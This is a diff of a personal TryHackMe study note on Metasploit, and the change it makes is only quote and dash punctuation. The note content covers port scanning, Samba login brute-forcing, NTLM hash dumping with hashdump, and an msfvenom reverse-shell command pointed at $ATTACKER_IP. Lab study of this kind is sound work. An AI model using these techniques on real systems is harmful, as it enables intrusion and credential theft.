@@ -7,7 +7,7 @@ date:: 2022-04-14
 
 ### Scanning
 
-Use `search portscan` to display built-in Metasploit port scanners. Note that `msfconsole` needs to be run as root for many scans to work — just like Nmap. That said, in my experience the fancier TCP scans (for example, SYN) don’t work over a VPN… So maybe best to stick with Nmap.
+Use `search portscan` to display built-in Metasploit port scanners. Note that `msfconsole` needs to be run as root for many scans to work - just like Nmap. That said, in my experience the fancier TCP scans (for example, SYN) don't work over a VPN... So maybe best to stick with Nmap.
 
 Speaking of which, Nmap can also be called internally (like other shell commands).
 
@@ -17,7 +17,7 @@ Metasploit has a variety of Samba/CIFS scanners too; use `search scanner/smb` to
 
 NetBIOS = Network Basic Input/Output System
 
-TryHackMe emphasizes the importance of examining the usage of NetBIOS for potential vulnerabilities, though it’s a bit light on specifics about what this means in practice.
+TryHackMe emphasizes the importance of examining the usage of NetBIOS for potential vulnerabilities, though it's a bit light on specifics about what this means in practice.
 
 Use `show advanced` to show additional module options.
 
@@ -25,7 +25,7 @@ The `auxiliary/scanner/http/http_version` module will give you HTTP server versi
 
 The `auxiliary/scanner/smb/smb_login` module will allow you to bruteforce Samba logins (username and/or password) using a wordlist(s).
 
-* [Using “nmap”](../notes/nmap.md)
+* [Using "nmap"](../notes/nmap.md)
 * [SAMBA (a.k.a. CIFS) Protocol](../notes/samba.md)
 * [TCP SYN Port Scanner - Metasploit](https://www.infosecmatter.com/metasploit-module-library/?mm=auxiliary/scanner/portscan/syn)
 
@@ -43,14 +43,14 @@ The `hosts` and `services` commands can then be used to display the, well, hosts
 
 Show the payloads available for a particular exploit using `show payloads`. Use `set payload` to set the payload for the exploit; re-run `show options` after this to check if the payload has added any additional options that will need to be set before exploitation.
 
-Use `sessions` to, well, manage your sessions (most useful when you’ve backgrounded a payload and/or are working with multiple targets).
+Use `sessions` to, well, manage your sessions (most useful when you've backgrounded a payload and/or are working with multiple targets).
 
 To dump NTLM hashes from Meterpreter, use the `hashdump` command. Normally only the first four fields are relevant:
 
 * Username
 * RID (the last four digits of the Windows SID, with leading zeros dropped)
-* The user’s LM password hash
-* The user’s NTLM password hash
+* The user's LM password hash
+* The user's NTLM password hash
 
 References:
 
@@ -90,4 +90,4 @@ msfvenom -p cmd/unix/reverse_python \
 LHOST=$ATTACKER_IP LPORT=$ATTACKER_PORT -f raw > rev_shell.py
 ```
 
-Use the `exploit/multi/handler` module in Metasploit to catch the shells produced using Msfvenom (note that you’ll need to use `set payload` to tell Metasploit *what* it’s catching!). We can catch both regular reverse shells and Meterpreter sessions this way.
+Use the `exploit/multi/handler` module in Metasploit to catch the shells produced using Msfvenom (note that you'll need to use `set payload` to tell Metasploit *what* it's catching!). We can catch both regular reverse shells and Meterpreter sessions this way.
